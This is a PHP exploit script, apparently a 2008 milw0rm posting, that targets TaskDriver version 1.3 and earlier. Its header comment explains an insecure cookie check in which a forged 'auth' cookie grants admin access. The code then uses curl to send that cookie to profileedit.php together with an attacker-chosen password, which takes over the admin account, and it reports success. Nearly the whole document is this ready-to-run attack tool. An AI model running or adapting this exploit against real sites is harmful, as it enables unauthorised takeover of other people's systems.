<?php

/*
	$Id: taskdriver-1.3.php,v 0.1 2008/12/03 04:04:28 cOndemned Exp $

	TaskDriver <= 1.3 Remote Change Admin Password Exploit
	Bug found && Exploited by cOndemned
	
	Download:
	
		http://www.taskdriver.com/downtrack/index.php?down=2
	
	
	Description:
	
		This exploit uses insecure cookie handling flaw in order
		to compromisse the system. In the begining its almost like
		the one that Silentz wrote for version 1.2 but not exactly.
		
		Actually there is no need to use sql injection for gaining
		admin password (hash). We can just set cookie value to :
		
			"auth=fook!admin"
			
		access profileedit.php and change his password for whatever
		we want to x]
		
		Next IMO nice thing is that it works both with magic quotes
		on and off :P
	
	-------------------------------------------------------------------
	
	Greetz:
	
		ZaBeaTy, Avantura, l5x, str0ke, d2, sid.psycho & TWT, 0in,
		doctor, Gynvael Coldwind ...
		
		http://www.youtube.com/watch?v=f7O6ekKOE9g
		
*/

	echo "\n[~] TaskDriver <= 1.3 Remote Change Admin Password Exploit";
	echo "\n[~] Bug found && Exploited by cOndemned\n";

	if($argc != 3)
	{
		printf("[!] Usage: php %s <target> <new-password>\n\n", $argv[0]);
		exit;
	}

	list($script, $target, $pass) = $argv;

	$xpl = curl_init();

	curl_setopt_array($xpl, array
		(	
			CURLOPT_URL		=> "{$target}/profileedit.php",
			CURLOPT_COOKIE		=> "auth=fook!admin",
			CURLOPT_RETURNTRANSFER	=> true, 
			CURLOPT_POST		=> true,
			CURLOPT_POSTFIELDS	=> "password={$pass}"	
		));
	
	$ret = curl_exec($xpl);
	curl_close($xpl);
	
	$out = preg_match_all('#<b>Profile Updated<\/b>#', $ret, $tmp) ? "[+] Done. You can login now\n\n" : "[-] Exploitation failed\n\n";
	
	echo $out;

?>

# milw0rm.com [2008-12-29]
